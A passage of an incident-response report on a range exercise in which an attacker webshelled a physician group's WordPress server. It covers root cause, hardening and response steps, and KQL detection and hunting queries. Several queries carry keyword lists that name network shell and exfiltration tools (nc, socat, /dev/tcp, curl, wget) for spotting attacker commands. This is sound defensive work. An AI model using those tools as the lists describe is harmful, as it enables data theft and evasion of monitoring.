| **Data confirmed exfiltrated**     | None confirmed. The webshell returned 200 responses during both rounds of encoding (04:36:45–04:37:19, and 14:14:39 and 14:15:15, at 4,004 and 1,240 bytes) (F7). Their content is not recorded (G4). The archive was deleted, with no sign that it left.                                                                                                                                                                                                                                                                                                       |
| **Business impact**                | An attacker could run any command as the web server account on Hartwell’s public scheduling site from 04:34 onwards. Two back doors remained at the end: the implant, and a hidden command channel inside a WordPress core file. The WordPress database password was exposed and is written in clear text in the process and audit logs. WordPress user names, emails and password hashes, and the site’s admin email, were queried. A staff account, debian, was used to write the webshell. A ransom note on the site claimed patient records were encrypted. |

### Accessed versus exfiltrated

I can prove the attacker read the database credentials, queried the user
table, packed and encoded both, and that the webshell sent back
responses at those moments. I can’t prove what those responses
contained, because no log records response bodies. The database
credential and the WordPress user hashes should therefore be treated as
taken. The ransom note claims patient records were encrypted, but no
encryption command appears in the records I reviewed (F7), and no query
touched patient or appointment data.

## 08 Root Cause

Root cause: the attacker got a working webshell through two conditions
the logs show, joined by one link they don’t.

- **The vulnerable feature:** debian13 ran a public-facing PHP 8.4.4
  with session upload progress enabled. The brief’s threat intelligence
  links that feature to an unauthenticated code-execution flaw
  (CVE-2026-109618 / CVE-2026-109619). The attacker’s exploit requests
  hit it from 04:33:53 (F1).

- **The debian account:** 38 seconds later, a shell running as debian
  wrote health-check.php into a web root that account could write to
  (F1).

- **The missing link:** the logs don’t show how the attacker came to act
  through debian, whether the exploit led there or they already held its
  credentials (G11).

Closing only one of the two conditions leaves the other open. Everything
after that followed from what the web server account was allowed to
write, read and run.

### Contributing factors

| **Ref** | **Factor**                                                                                                                                                 | **Effect**                                                                                 | **Finding**     |
|---------|------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------|-----------------|
| C1      | The debian account had SSH access and could write to the web root, and its 04:34 session is missing from the auth log                                      | The webshell was written through a staff account, unseen by authentication logging         | F1; G11         |
| C2      | The web root was writable by the web server account                                                                                                        | The WordPress backdoor and the ransom note were written there                              | F6, F7          |
| C3      | PHP was allowed to run system commands, and the web server account could start a shell, curl, the MySQL client, tar and crontab                            | The webshell became a full command line                                                    | F2, F6, F7      |
| C4      | The database password sat in plain text in wp-config.php, and that account could read every column of wp_users                                             | One file read led to the user table and password hashes                                    | F4              |
| C5      | /tmp and /dev/shm allowed files to be written and run                                                                                                      | The implant was staged and run outside the web root                                        | F6              |
| C6      | Process and audit logging record full command lines                                                                                                        | The database password is now stored in the security logs                                   | F4              |
| C7      | Collection gaps: Sysmon started late, the enriched log missed the first three hours, all logging stopped for 78 minutes, and the auth log missed a session | Parts of the chain can only be inferred                                                    | G1, G2, G9, G11 |
| C8      | The auditd alerts fired, but nothing in the window shows a response                                                                                        | The attacker ran from 04:34 to the end of the window and came back after a partial cleanup | F6; Section 07  |

### Alternatives Tested

| **Alternative**                                                 | **Result**                                                                                       |
|-----------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| The exploit alone wrote the webshell                            | **Not supported.** The file was written by a debian shell (Query 33, F1).                        |
| Entry through the debian account’s SSH credentials              | **Not ruled out.** The session’s source isn’t logged (G11).                                      |
| Monitoring disabled to hide the attack                          | **Ruled out.** auditd kept recording, and the 12:26 silence hit every log (F5).                  |
| Files encrypted for ransom                                      | **Not supported.** No encryption command in the first-run record; a full sweep wasn’t done (F7). |
| Spread to another host                                          | **No evidence** (F8).                                                                            |
| The background browser and crawler traffic as attacker activity | **Ruled out.** It never touched the webshell or the exploit path (F8).                           |

## 09 Recommendations

### 9.1 Recommendations

Ranked by how much of this intrusion each change would have stopped.

| **\#** | **Recommendation**                                                                                                                                                                                                                       | **Addresses**                | **Risk if not done**                                                        | **Priority** |
|--------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------|-----------------------------------------------------------------------------|--------------|
| R1     | Disable session upload progress in PHP (session.upload_progress.enabled = Off) and upgrade PHP once a fixed release is confirmed                                                                                                         | Root cause, F1               | The exploit stays open to any address                                       | High         |
| R2     | Lock the debian account and rotate its credentials. Remove SSH key SHA256:3KKg2KTuBmrcaaoBtXv0x5nq4UfcqGO70g2BDJUjPKo unless its owner accounts for it. Review every SSH key on the host, and which accounts can write to /var/www/html. | C1; F1, F8                   | The route that wrote the webshell stays open                                | High         |
| R3     | Restore WordPress core files from a known-good copy and verify every file against the official checksums, starting with wp-includes/version.php                                                                                          | F6                           | The cookie backdoor keeps giving command execution after every other fix    | High         |
| R4     | Make /var/www/html read-only to the web server account, except the upload directory, and block PHP’s command functions (system, exec, shell_exec, passthru, proc_open, popen)                                                            | C2, C3; F2, F6               | Any future code execution again becomes a webshell with a full command line | High         |
| R5     | Rotate the wpuser database password and limit wpuser to what WordPress needs. Force password resets for all WordPress users. Restrict who can read the Sysmon and audit logs that hold the old password.                                 | C4, C6; F4, F7               | The stolen credential and hashes stay usable                                | High         |
| R6     | Deploy detections D1–D3 (9.3) with a response runbook whose first step is isolating the web server                                                                                                                                       | C8; F1, F2, F6               | The next intrusion runs for hours again before anyone acts                  | High         |
| R7     | Mount /dev/shm and /tmp with noexec,nosuid                                                                                                                                                                                               | C5; F6                       | Implants keep a place to be staged and run                                  | Medium       |
| R8     | Close the collection gaps: start Sysmon at boot with hashing enabled, capture enriched HTTP all day, fix the error-log clock, make sure every SSH session reaches the auth log, and alert when any source stops sending                  | C7; G1, G2, G7, G9, G10, G11 | The next investigation has the same blind spots                             | Medium       |

### 9.2 Response steps

Not performed: this was a range exercise. In order:

1.  **Preserve evidence before anything restarts.** Copy
    /dev/shm/.cache-helper, wp-includes/version.php, the www-data
    crontab and the web root. Also copy debian’s authorized_keys and
    shell history. /dev/shm is cleared on reboot, so the implant exists
    only in memory-backed storage (F6). *Verify:* the copies are hashed
    and stored off the host.

2.  **Contain.** Block 192.168.1.100, lock the debian account (R2), and
    apply R1 before re-enabling PHP. *Verify:* a test POST that sets the
    session upload progress field produces no session warnings, and the
    debian account can’t log in.

3.  **Eradicate.** Remove the www-data crontab entry, stop the implant,
    delete /dev/shm/.cache-helper, and restore WordPress core (R3).
    *Verify:* crontab -l -u www-data is empty; no process runs from
    /dev/shm; a request carrying an X-Debug-Mode cookie runs nothing;
    the core checksums pass.

4.  **Recover.** Apply R4, R5 and R7, then bring the site back.
    *Verify:* a test PHP file calling system("id") fails, and the old
    wpuser password is rejected.

### The naive move and why it fails

- **Deleting health-check.php.** Root did this at 13:52:38. The backdoor
  in version.php and the implant survived, and the attacker re-exploited
  the server 57 seconds later (F6).

- **Rebooting to clear it.** That destroys the only copy of the implant,
  and leaves both version.php and the debian account untouched.

- **Blocking 192.168.1.100 alone.** The exploit is open to any address,
  and the debian session’s source isn’t known (G11).

- **Responding to the ransom note.** No encryption was observed (F7).
  Paying, or restoring from backup on the strength of the note, treats a
  claim as a fact.

**Persistence that survives the obvious fix:** the cookie backdoor in
wp-includes/version.php, the implant in /dev/shm, the www-data crontab,
and the debian account with its SSH key (F6, F8).

### 9.3 Detections

Each rule was run against all the data available for 2026-10-23 and
returned only attacker activity.

#### D1: PHP session warnings at request start-up from one client (exploit attempt)
Data source: HartwellApacheError_CL. Validated by Query 29.

```kql
HartwellApacheError_CL
| where Message has "PHP Request Startup"
and (Message has "Session ID is too long" or Message has "Failed to read session data")
| summarize Warnings = count(), FirstSeen = min(OriginalTime) by ClientIP, bin(OriginalTime, 10m)
| where Warnings >= 2
```

Result: three bursts, all from 192.168.1.100, at 04:33:53, 12:18:05 and
13:53:35 (corrected), matching the three exploit runs (F1). No other
client.  
False-positive note: a single malformed session cookie from a real
visitor could raise one warning, so the threshold is two in 10 minutes.
Fix the error-log clock (G7) before deploying, or alert times will be 4
hours off.

#### D2: The web server starting a shell as www-data
Data source: HartwellSysmon_CL. Validated by Query 30.

```kql
HartwellSysmon_CL
| where RuleName == "ProcessCreate" and User == "www-data"
| where ParentImage endswith "/apache2" or ParentImage has "php"
| where Image endswith "/sh" or Image endswith "/dash" or Image endswith "/bash"
| project OriginalTime, ParentImage, Image, CommandLine
```

Result: every webshell command, from 12:21:07 to 14:19:10 (F2). Not
matched: root’s mariadb-check and version checks under PHP, and root’s
logger, tee and apache-log-backup.sh under Apache (F8).  
False-positive note: if a WordPress plugin legitimately shells out,
allow-list its exact command line, never the account.

#### D3: A program running from a temporary directory
Data source: HartwellAudit_CL. Validated by Query 31.

```kql
HartwellAudit_CL
| where AuditType == "SYSCALL" and RawLine has "syscall=59"
| extend Exe = extract(@'exe="([^"]+)"', 1, RawLine)
| where Exe startswith "/dev/shm/" or Exe startswith "/tmp/" or Exe startswith "/var/tmp/"
| project OriginalTime, Exe, RawLine
```

Result: /dev/shm/.cache-helper from 04:36:22, and /tmp/.update at
04:34:50. Nothing else. Because it uses auditd, it covers the period
before Sysmon started (G1).  
False-positive note: none in this data. Some installers run from /tmp,
so allow-list them by exact path. The rule doesn’t cover other writable
locations.

## 10 Regulatory Notification

| **Personal data involved** | **Yes.** WordPress user names, email addresses, registration dates and password hashes were queried from wp_users, and the site’s admin email from wp_options (F4). Which rows came back is not recorded (G5). No query against patient or appointment data was observed (Query 14, Query 32).                                                                   |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Regulation(s) engaged**  | **Under assessment.** The brief doesn’t state Hartwell’s jurisdiction, or whether any wp_users accounts belong to patients. As a physician group, Hartwell may fall under health-privacy rules if any patient data is involved. None was shown to be touched, and the ransom note’s claim that patient records were encrypted is not supported by the logs (F7). |
| **Notification required**  | **Under assessment.** Personal data was accessed; its exfiltration is not proven (Section 07). Legal needs to decide whether the regimes that apply are triggered by access alone.                                                                                                                                                                               |
| **Deadline (UTC)**         | **Depends on the regime.** Awareness began with the auditd alerts on 2026-10-23, but the alert time is not recorded (G8), so no deadline can be calculated.                                                                                                                                                                                                      |
| **Notified (UTC)**         | Not notified. This was a range exercise.                                                                                                                                                                                                                                                                                                                         |
| **Notified by**            | Not applicable                                                                                                                                                                                                                                                                                                                                                   |

## 11 Appendices

## Appendix A: Queries

Every query cited in this report, numbered in the order it was run. All were run in Microsoft Sentinel against workspace LAW-HuntPractice, filtered on OriginalTime. Query 6 is not included: it was exploratory, and nothing in this report relies on it. Each query is also saved as its own file in [`queries/`](queries/).

<details>
<summary><b>Query 1:</b> Requests per source address, to identify the scanner</summary>

File: [`queries/query-01-requests-per-source-address-to-identify-the.kql`](queries/query-01-requests-per-source-address-to-identify-the.kql) · Screenshot: [B-1](#b-1)

```kql
HartwellApache_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| summarize RawRows = count(), DistinctRequests = dcount(RawLine), DistinctURIs = dcount(URI), Status404 = countif(StatusCode == "404"),
    FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), UserAgents = make_set(UserAgent, 5) by SourceIP
| extend IsStaff = SourceIP in ("192.168.1.50", "192.168.1.80")
| sort by DistinctRequests desc
```

</details>

<details>
<summary><b>Query 2:</b> User agents used by 192.168.1.100</summary>

File: [`queries/query-02-user-agents-used-by-192-168-1.kql`](queries/query-02-user-agents-used-by-192-168-1.kql) · Screenshot: [B-2](#b-2)

```kql
HartwellApache_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where SourceIP == "192.168.1.100"
| summarize RawRows = count(), DistinctRequests = dcount(RawLine), DistinctURIs = dcount(URI),
    FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by UserAgent
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 3:</b> Error-log entries from 192.168.1.100</summary>

File: [`queries/query-03-error-log-entries-from-192-168-1.kql`](queries/query-03-error-log-entries-from-192-168-1.kql) · Screenshot: [B-3](#b-3)

```kql
HartwellApacheError_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where ClientIP has "192.168.1.100"
| extend MessagePattern = replace_regex(Message, @"[0-9]+", "N")
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), SampleMessage = take_any(Message)
    by Level, Module, MessagePattern
| sort by RawRows desc
```

</details>

<details>
<summary><b>Query 4:</b> Search of all web tables for upload_progress</summary>

File: [`queries/query-04-search-of-all-web-tables-for-upload.kql`](queries/query-04-search-of-all-web-tables-for-upload.kql) · Screenshot: [B-4](#b-4)

```kql
union
(HartwellApacheError_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where RawLine contains "upload_progress"
 | project OriginalTime, SourceTable = "ApacheError", Source = ClientIP, Detail = RawLine),
(HartwellApache_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where RawLine contains "upload_progress"
 | project OriginalTime, SourceTable = "Apache", Source = SourceIP, Detail = RawLine),
(HartwellHTTPEnriched_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where request_headers contains "upload_progress" or uri contains "upload_progress" or x_hmg_debug_decoded contains "upload_progress"
 | project OriginalTime, SourceTable = "HTTPEnriched", Source = id_orig_h, Detail = strcat(method, " ", uri, " | ", content_type, " | ", request_headers))
| sort by OriginalTime asc
```

</details>

<details>
<summary><b>Query 5:</b> Method and content type per source</summary>

File: [`queries/query-05-method-and-content-type-per-source.kql`](queries/query-05-method-and-content-type-per-source.kql) · Screenshot: [B-5](#b-5)

```kql
HartwellHTTPEnriched_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| extend ContentTypeBase = tolower(trim(@"\s", tostring(split(content_type, ";")[0])))
| extend InExploitWindow = OriginalTime between (datetime(2026-10-23T08:18:05Z) .. datetime(2026-10-23T08:19:48Z))
    or OriginalTime between (datetime(2026-10-23T09:53:35Z) .. datetime(2026-10-23T09:57:01Z))
| summarize RawRows = count(), ExploitWindowRows = countif(InExploitWindow), DistinctURIs = dcount(uri), SampleURIs = make_set(uri, 5),
    FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), MaxBodyLen = max(tolong(request_body_len))
    by id_orig_h, method, ContentTypeBase
| sort by ExploitWindowRows desc, RawRows desc
```

</details>

<details>
<summary><b>Query 7:</b> First appearance of health-check.php in each table</summary>

File: [`queries/query-07-first-appearance-of-health-check-php-in.kql`](queries/query-07-first-appearance-of-health-check-php-in.kql) · Screenshot: [B-7](#b-7)

```kql
union
(HartwellApache_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where URI contains "health-check"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable = "Apache", Who = SourceIP, Action = Method, Detail = StatusCode),
(HartwellHTTPEnriched_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where uri contains "health-check"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable = "HTTPEnriched", Who = id_orig_h, Action = method, Detail = "-"),
(HartwellSysmon_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where CommandLine contains "health-check" or ParentCommandLine contains "health-check"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable = "Sysmon", Who = User, Action = RuleName, Detail = CommandLine)
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 8:</b> Processes started by Apache or PHP, by user</summary>

File: [`queries/query-08-processes-started-by-apache-or-php-by.kql`](queries/query-08-processes-started-by-apache-or-php-by.kql) · Screenshot: [B-8](#b-8)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate"
| where ParentImage has_any ("apache2", "httpd", "php")
| summarize RawRows = count(), DistinctCommands = dcount(CommandLine, 4), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime),
    Images = make_set(Image, 15), SampleCommands = make_set(CommandLine, 10)
    by User, ParentImage
| sort by RawRows desc
```

</details>

<details>
<summary><b>Query 9:</b> Header names on requests to health-check.php</summary>

File: [`queries/query-09-header-names-on-requests-to-health-check.kql`](queries/query-09-header-names-on-requests-to-health-check.kql) · Screenshot: [B-9](#b-9)

```kql
HartwellHTTPEnriched_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where uri contains "health-check"
| extend HeaderNames = bag_keys(todynamic(request_headers))
| mv-expand HeaderName = HeaderNames to typeof(string)
| summarize RawRows = count(), RowsWithDecoded = countif(isnotempty(x_hmg_debug_decoded)), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime),
    SampleRaw = take_any(x_hmg_debug_raw), SampleDecoded = take_any(x_hmg_debug_decoded), SampleHeaders = take_any(request_headers)
    by HeaderName
| sort by RawRows asc
```

</details>

<details>
<summary><b>Query 10:</b> Reversal of the header encoding for every value</summary>

File: [`queries/query-10-reversal-of-the-header-encoding-for-every.kql`](queries/query-10-reversal-of-the-header-encoding-for-every.kql) · Screenshot: [B-10](#b-10)

```kql
HartwellHTTPEnriched_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where isnotempty(x_hmg_debug_raw)
| extend Base64Decoded = base64_decode_tostring(x_hmg_debug_raw)
| extend ThenRot13 = translate("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm", Base64Decoded)
| summarize TotalRows = count(), DistinctRaw = dcount(x_hmg_debug_raw, 4), MatchesDecoded = countif(ThenRot13 == x_hmg_debug_decoded),
    NoMatch = countif(ThenRot13 != x_hmg_debug_decoded), SampleBase64Decoded = take_any(Base64Decoded), SampleThenRot13 = take_any(ThenRot13), SampleDecoded = take_any(x_hmg_debug_decoded)
```

</details>

<details>
<summary><b>Query 11:</b> Network discovery commands run by www-data</summary>

File: [`queries/query-11-network-discovery-commands-run-by-www-data.kql`](queries/query-11-network-discovery-commands-run-by-www-data.kql) · Screenshot: [B-11](#b-11)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine has_any ("ip", "ifconfig", "arp", "neigh", "route", "ss", "netstat", "ping", "nmap", "hostname", "resolv.conf", "/proc/net")
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 12:</b> Process, service and security-tool enumeration by www-data</summary>

File: [`queries/query-12-process-service-and-security-tool-enumeration-by.kql`](queries/query-12-process-service-and-security-tool-enumeration-by.kql) · Screenshot: [B-12](#b-12)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine has_any ("ps", "pgrep", "systemctl", "service", "dpkg", "apt", "which", "ls", "find", "lsmod", "auditctl")
    or CommandLine contains "sysmon" or CommandLine contains "audit" or CommandLine contains "splunk"
    or CommandLine contains "falco" or CommandLine contains "ossec" or CommandLine contains "wazuh" or CommandLine contains "crowdstrike" or CommandLine contains "falcon"
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 13:</b> Configuration-file access by www-data</summary>

File: [`queries/query-13-configuration-file-access-by-www-data.kql`](queries/query-13-configuration-file-access-by-www-data.kql) · Screenshot: [B-13](#b-13)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine contains "config" or CommandLine contains "DB_" or CommandLine contains ".env" or CommandLine contains ".ini" or CommandLine contains ".cnf"
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 14:</b> MySQL queries run by www-data</summary>

File: [`queries/query-14-mysql-queries-run-by-www-data.kql`](queries/query-14-mysql-queries-run-by-www-data.kql) · Screenshot: [B-14](#b-14)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine contains "mysql" or CommandLine contains "mariadb" or CommandLine contains "SELECT" or CommandLine contains "wp_users" or CommandLine contains "user_pass"
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 15:</b> Service-control commands run by www-data</summary>

File: [`queries/query-15-service-control-commands-run-by-www-data.kql`](queries/query-15-service-control-commands-run-by-www-data.kql) · Screenshot: [B-15](#b-15)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine contains "systemctl" or CommandLine contains "service " or CommandLine contains "kill" or CommandLine contains "auditctl"
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 16:</b> Service stops and starts, and logging after the stop attempts</summary>

File: [`queries/query-16-service-stops-and-starts-and-logging-after.kql`](queries/query-16-service-stops-and-starts-and-logging-after.kql) · Screenshot: [B-16](#b-16)

```kql
let Start = datetime(2026-10-23T04:00:00Z);
let End = datetime(2026-10-23T16:00:00Z);
let LastStop = datetime(2026-10-23T14:14:07Z);
union
(HartwellSyslog_CL
 | where OriginalTime between (Start .. End)
 | where Message has_any ("sysmon", "auditd", "SplunkForwarder", "polkit", "polkitd") or Process has_any ("polkitd", "auditd")
 | project OriginalTime, SourceTable = "Syslog", Detail = replace_regex(Message, @"[0-9]+", "N")),
(HartwellAuth_CL
 | where OriginalTime between (Start .. End)
 | where Message has_any ("polkit", "systemctl", "sysmon", "auditd", "SplunkForwarder") or Process has "polkit"
 | project OriginalTime, SourceTable = "Auth", Detail = replace_regex(Message, @"[0-9]+", "N")),
(HartwellAudit_CL
 | where OriginalTime between (Start .. End)
 | where AuditType in ("CONFIG_CHANGE", "SERVICE_STOP", "SERVICE_START", "DAEMON_END", "DAEMON_START")
 | project OriginalTime, SourceTable = "Audit", Detail = strcat(AuditType, ": ", replace_regex(RawLine, @"[0-9]+", "N"))),
(HartwellSysmon_CL
 | where OriginalTime between (LastStop .. End)
 | project OriginalTime, SourceTable = "SysmonAfterLastStop", Detail = "any event"),
(HartwellAudit_CL
 | where OriginalTime between (LastStop .. End)
 | project OriginalTime, SourceTable = "AuditAfterLastStop", Detail = "any event")
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable, Detail
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 17:</b> Persistence commands run by www-data</summary>

File: [`queries/query-17-persistence-commands-run-by-www-data.kql`](queries/query-17-persistence-commands-run-by-www-data.kql) · Screenshot: [B-17](#b-17)

```kql
HartwellSysmon_CL
| where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where RuleName == "ProcessCreate" and User == "www-data"
| where CommandLine contains "cron" or CommandLine contains "systemctl enable" or CommandLine contains "authorized_keys" or CommandLine contains ".bashrc" or CommandLine contains ".profile"
    or CommandLine contains "at now" or CommandLine contains "systemd/system" or CommandLine contains "rc.local" or CommandLine contains "nohup"
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by CommandLine, Image, ParentImage
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 18:</b> Every reference to /dev/shm</summary>

File: [`queries/query-18-every-reference-to-dev-shm.kql`](queries/query-18-every-reference-to-dev-shm.kql) · Screenshot: [B-18](#b-18)

```kql
union
(HartwellSysmon_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where CommandLine contains "/dev/shm" or Image startswith "/dev/shm"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable = "Sysmon", Who = User, Action = RuleName, Detail = strcat(Image, " | ", CommandLine)),
(HartwellHTTPEnriched_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where x_hmg_debug_decoded contains "/dev/shm"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable = "HTTPEnriched", Who = id_orig_h, Action = method, Detail = x_hmg_debug_decoded),
(HartwellAudit_CL
 | where OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z))
 | where RawLine contains "/dev/shm"
 | summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime), Detail = take_any(RawLine) by SourceTable = "Audit", Who = "-", Action = AuditType)
| sort by FirstSeen asc
```

</details>

<details>
<summary><b>Query 19:</b> Encoding commands matched to Apache response sizes</summary>

File: [`queries/query-19-encoding-commands-matched-to-apache-response-sizes.kql`](queries/query-19-encoding-commands-matched-to-apache-response-sizes.kql) · Screenshot: [B-19](#b-19)

```kql
let Start = datetime(2026-10-23T04:00:00Z);
let End = datetime(2026-10-23T16:00:00Z);
let ApacheResp = HartwellApache_CL
| where OriginalTime between (Start .. End)
| where URI contains "health-check" and SourceIP == "192.168.1.100"
| summarize ApacheRows = count(), StatusCodes = make_set(StatusCode, 5), ResponseSizes = make_set(tolong(ResponseSize), 5) by Sec = bin(OriginalTime, 1s);
HartwellHTTPEnriched_CL
| where OriginalTime between (Start .. End)
| where isnotempty(x_hmg_debug_decoded)
| where x_hmg_debug_decoded has_any ("base64", "curl", "wget", "scp", "rsync", "nc", "ncat", "socat", "ftp", "sftp", "/dev/tcp", "tar", "zip")
| extend Sec = bin(OriginalTime, 1s)
| join kind=leftouter ApacheResp on Sec
| project OriginalTime, id_orig_h, uri, x_hmg_debug_decoded, ApacheRows, StatusCodes, ResponseSizes
| sort by OriginalTime asc
```

</details>

<details>
<summary><b>Query 20:</b> Lateral-movement tools, internal addresses, network events and SSH logins</summary>

File: [`queries/query-20-lateral-movement-tools-internal-addresses-network-events.kql`](queries/query-20-lateral-movement-tools-internal-addresses-network-events.kql) · Screenshot: [B-20](#b-20)

```kql
let Start = datetime(2026-10-23T04:00:00Z);
let End = datetime(2026-10-23T16:00:00Z);
let Tools = dynamic(["ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "socat", "telnet", "psql", "smbclient", "sshpass", "ansible"]);
union
(HartwellHTTPEnriched_CL
 | where OriginalTime between (Start .. End)
 | where x_hmg_debug_decoded has_any (Tools) or x_hmg_debug_decoded matches regex @"192\.168\.1\.\d+" or x_hmg_debug_decoded contains "/dev/tcp"
 | project OriginalTime, SourceTable = "HTTPEnriched", Who = id_orig_h, Detail = x_hmg_debug_decoded),
(HartwellSysmon_CL
 | where OriginalTime between (Start .. End)
 | where RuleName == "ProcessCreate" and User == "www-data"
 | where CommandLine has_any (Tools) or CommandLine matches regex @"192\.168\.1\.\d+" or CommandLine contains "/dev/tcp" or CommandLine contains "mysql -h"
 | project OriginalTime, SourceTable = "SysmonProcess", Who = User, Detail = CommandLine),
(HartwellSysmon_CL
 | where OriginalTime between (Start .. End)
 | where RuleName == "NetworkConnect"
 | project OriginalTime, SourceTable = "SysmonNetwork", Who = User, Detail = strcat(Image, " | ", tostring(CommandLine))),
(HartwellAuth_CL
 | where OriginalTime between (Start .. End)
 | where Message has_any ("Accepted", "Failed password", "Invalid user")
 | project OriginalTime, SourceTable = "Auth", Who = Process, Detail = replace_regex(Message, @"port [0-9]+", "port N"))
| summarize RawRows = count(), FirstSeen = min(OriginalTime), LastSeen = max(OriginalTime) by SourceTable, Who, Detail
| sort by SourceTable asc, FirstSeen asc
```

</details>

<details>
<summary><b>Query 21:</b> First and last event in each table</summary>

File: [`queries/query-21-first-and-last-event-in-each-table.kql`](queries/query-21-first-and-last-event-in-each-table.kql) · Screenshot: [B-21](#b-21)

```kql
union withsource = SourceTable HartwellApache_CL, HartwellApacheError_CL, HartwellHTTPEnriched_CL, HartwellSysmon_CL, HartwellAudit_CL, HartwellSyslog_CL, HartwellAuth_CL
| where OriginalTime between (datetime(2026-10-22T00:00:00Z) .. datetime(2026-10-25T00:00:00Z))
| summarize FirstEvent = min(OriginalTime), LastEvent = max(OriginalTime),
    RowsInWindow = countif(OriginalTime between (datetime(2026-10-23T04:00:00Z) .. datetime(2026-10-23T16:00:00Z)))
    by SourceTable
| sort by SourceTable asc
```

</details>

<details>
<summary><b>Query 22:</b> Error-log clock offset, from parse errors matched to Apache 500s</summary>

File: [`queries/query-22-error-log-clock-offset-from-parse-errors.kql`](queries/query-22-error-log-clock-offset-from-parse-errors.kql) · Screenshot: [B-22](#b-22)

```kql
let Err = HartwellApacheError_CL
| where OriginalTime between (datetime(2026-10-23T00:00:00Z) .. datetime(2026-10-23T16:00:00Z))
| where Message has "health-check.php" and Message has "Parse error"
